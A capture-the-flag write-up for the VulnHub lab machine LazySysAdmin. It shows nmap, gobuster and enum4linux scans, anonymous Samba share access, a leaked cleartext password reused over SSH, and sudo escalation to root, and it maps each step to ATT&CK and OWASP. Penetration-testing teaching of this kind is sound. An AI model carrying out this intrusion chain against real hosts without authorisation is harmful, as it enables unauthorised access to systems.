## LazySysAdmin

| **Platform**   | VulnHub         |
| -------------- | --------------- |
| **Machine**    | LazySysAdmin: 1 |
| **Creator**    | Togie Mcdogie   |
| **OS**         | Linux           |
| **Difficulty** | Beginner        |

use `netdiscover` to find the target VM, then use `Nmap`.

~~~
 nmap -vv -sV 10.0.2.28
~~~

| Port | Service     | Details                                                        |
| ---- | ----------- | -------------------------------------------------------------- |
| 22   | SSH         | OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) |
| 80   | HTTP        | Apache httpd 2.4.7 ((Ubuntu))                                  |
| 139  | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                    |
| 445  | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                    |
| 3306 | mysql       | MySQL (unauthorized)                                           |
| 6667 | irc         | InspIRCd                                                       |

access the website.

<img width="1181" height="866" alt="image" src="https://github.com/user-attachments/assets/1a6ca89d-449f-4203-989f-d1b19fefe4e6" />


use `gobuster` for directory enumeration.

~~~
gobuster dir -u http://10.0.2.28/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js,cgi,xml
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.28/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,js,cgi,xml
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 36072]
info.php             (Status: 200) [Size: 77134]
wordpress            (Status: 301) [Size: 309] [--> http://10.0.2.28/wordpress/]
test                 (Status: 301) [Size: 304] [--> http://10.0.2.28/test/]
wp                   (Status: 301) [Size: 302] [--> http://10.0.2.28/wp/]
apache               (Status: 301) [Size: 306] [--> http://10.0.2.28/apache/]
old                  (Status: 301) [Size: 303] [--> http://10.0.2.28/old/]
javascript           (Status: 301) [Size: 310] [--> http://10.0.2.28/javascript/]
robots.txt           (Status: 200) [Size: 92]
phpmyadmin           (Status: 301) [Size: 310] [--> http://10.0.2.28/phpmyadmin/]
server-status        (Status: 403) [Size: 289]
Progress: 1543906 / 1543906 (100.00%)
===============================================================
Finished
===============================================================
~~~

in **/wordpress/**  we see a potential username.


<img width="1665" height="752" alt="image" src="https://github.com/user-attachments/assets/62da20c5-acb1-4f16-9e70-d1be673b20a2" />



enumerate further.
~~~
gobuster dir -u http://10.0.2.28/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js,cgi,xml
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.28/wordpress/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,js,cgi,xml,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
wp-content           (Status: 301) [Size: 320] [--> http://10.0.2.28/wordpress/wp-content/]
index.php            (Status: 301) [Size: 0] [--> http://10.0.2.28/wordpress/]
license.txt          (Status: 200) [Size: 19935]
wp-includes          (Status: 301) [Size: 321] [--> http://10.0.2.28/wordpress/wp-includes/]
wp-login.php         (Status: 200) [Size: 2513]
readme.html          (Status: 200) [Size: 7413]
wp-trackback.php     (Status: 200) [Size: 135]
wp-admin             (Status: 301) [Size: 318] [--> http://10.0.2.28/wordpress/wp-admin/]
Progress: 126576 / 1543913 (8.20%)[ERROR] error on word xmlrpc.php: timeout occurred during the request
wp-signup.php        (Status: 302) [Size: 0] [--> http://10.0.2.28/wordpress/wp-login.php?action=register]
Progress: 1543906 / 1543906 (100.00%)
===============================================================
Finished
===============================================================
~~~

in **/wordpress/wp-login.php/** is a login form.


<img width="1665" height="752" alt="image" src="https://github.com/user-attachments/assets/5cb96f02-4b52-41b5-b02d-9fcdf61c732d" />



use `enum4linux` to get more information (specifically about Samba shares)

~~~
 enum4linux -a 10.0.2.28     
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Oct 20 06:16:49 2026

 =========================================( Target Information )=========================================

Target ........... 10.0.2.28
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 10.0.2.28 )=============================


[+] Got domain/workgroup name: WORKGROUP


====Shortened=====

 ===================================( Share Enumeration on 10.0.2.28 )===================================


	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	share$          Disk      Sumshare
	IPC$            IPC       IPC Service (Web server)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAZYSYSADMIN

[+] Attempting to map shares on 10.0.2.28

//10.0.2.28/print$	Mapping: DENIED Listing: N/A Writing: N/A
//10.0.2.28/share$	Mapping: OK Listing: OK Writing: N/A

===Shortened=====

enum4linux complete on Tue Oct 20 06:17:20 2026

~~~


access discovered share and get the file that looks interesting:

~~~
smbclient //10.0.2.28/share$

smb: \> ls
  .                                   D        0  Tue Aug 15 04:05:52 2017
  ..                                  D        0  Mon Aug 14 05:34:47 2017
  wordpress                           D        0  Tue Aug 15 04:21:08 2017
  Backnode_files                      D        0  Mon Aug 14 05:08:26 2017
  wp                                  D        0  Tue Aug 15 03:51:23 2017
  deets.txt                           N      139  Mon Aug 14 05:20:05 2017
  robots.txt                          N       92  Mon Aug 14 05:36:14 2017
  todolist.txt                        N       79  Mon Aug 14 05:39:56 2017
  apache                              D        0  Mon Aug 14 05:35:19 2017
  index.html                          N    36072  Sat Aug  5 22:02:15 2017
  info.php                            N       20  Tue Aug 15 03:55:19 2017
  test                                D        0  Mon Aug 14 05:35:10 2017
  old                                 D        0  Mon Aug 14 05:35:13 2017

		3029776 blocks of size 1024. 1403804 blocks available
smb: \> get deets.txt
getting file \deets.txt of size 139 as deets.txt (5.4 KiloBytes/sec) (average 5.4 KiloBytes/sec)

~~~

in the file, we see...

~~~
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345
~~~

a password!


try **togie:12345** in the login form, they don't work. standard credentials **admin:admin** also don't work, but confirm that a user with the username **admin** exists.


<img width="1665" height="752" alt="image" src="https://github.com/user-attachments/assets/aa08baf0-aa62-4e6e-8490-65c2f1786015" />



try `ssh` with **togie:12345** which, surprisingly, works!
`sudo -l` shows **togie** has unlimited sudo.

~~~

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL

~~~

so, `sudo su` can be used to get root access and the flag.

~~~
root@LazySysAdmin:~# cat proof.txt
~~~


#### MITRE ATT&CK Mapping

| **Actions**                | **Step**                            | **Technique**                                                      |
| -------------------------- | ----------------------------------- | ------------------------------------------------------------------ |
| Service discovery          | Scan with Nmap                      | T1595 Active scanning                                              |
| Web content discovery      | Directory enumeration with Gobuster | T1595.003 Active Scanning: Wordlist Scanning                       |
| Access web directory       | Get username from `/wordpress/`     | T1594  Search Victim-Owned Websites                                |
| Samba share discovery      | Samba share enumeration             | T1595 Active scanning                                              |
| Access file in share       | Get **deets.txt**                   | T1552.001 Unsecured Credentials: Credentials In Files              |
| Initial access             | Login into ssh                      | T0859 Valid Accounts                                               |
| Local privilege escalation | Sudo su                             | T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching |

#### OWASP Vulnerability Table

| **Vulnerability**         | **Impact**                                   |
| ------------------------- | -------------------------------------------- |
| Broken Access Control     | samba share accessed with no password        |
| Insecure Design           | obtained cleartext password stored in a file |
